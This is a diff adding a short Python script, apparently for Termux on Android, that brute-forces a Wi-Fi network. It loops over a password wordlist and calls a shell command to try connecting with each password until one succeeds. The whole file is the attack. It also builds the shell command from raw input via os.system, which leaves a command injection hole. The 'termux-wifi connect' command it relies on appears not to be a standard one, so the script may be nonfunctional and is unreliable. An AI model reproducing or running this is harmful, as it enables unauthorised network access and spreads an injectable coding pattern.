@@ -1,0 +1,23 @@
+import os
+
+# Function to connect to a Wi-Fi network using termux-wifi
+def connect_to_wifi(ssid, password):
+    command = f'termux-wifi connect -s {ssid} -p {password}'
+    return os.system(command) == 0
+
+# Prompt for the Wi-Fi SSID
+ssid = input("Enter the Wi-Fi SSID: ")
+
+# Path to the text file containing passwords
+password_file = 'passwords.txt'
+
+with open(password_file, 'r') as file:
+    passwords = file.readlines()
+
+for password in passwords:
+    password = password.strip()
+    if connect_to_wifi(ssid, password):
+        print(f'Successfully connected to Wi-Fi with password: {password}')
+        break
+    else:
+        print(f'Failed to connect with password: {password}')
